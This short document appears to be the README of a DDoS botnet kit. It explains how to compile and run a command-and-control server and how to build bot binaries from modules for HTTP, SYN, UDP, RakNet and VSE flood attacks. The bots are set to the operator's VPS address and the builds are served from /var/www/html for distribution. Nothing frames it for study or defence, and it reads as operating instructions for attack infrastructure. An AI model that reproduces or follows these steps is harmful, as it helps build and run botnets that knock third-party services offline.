# How to compile cnc?
-------------------------
- Run this:
sh buildcnc.sh
-------------------------

- And run with

-------------------------
screen ./server <botport> <threads> <cncport>
example: screen ./server 1338 10 1337
-------------------------


# How to compile and run bot
- You should change change ip in bot/main.c to your vps ip and bot port screened already
- Run: sh legacybotbuilder.sh and bins will be put into /var/www/html
- Payload: gcc -o bot checksum.c daemon.c http_attack.c \
    raknet_attack.c socket_attack.c syn_attack.c udp_attack.c \
    vse_attack.c main.c -Wall
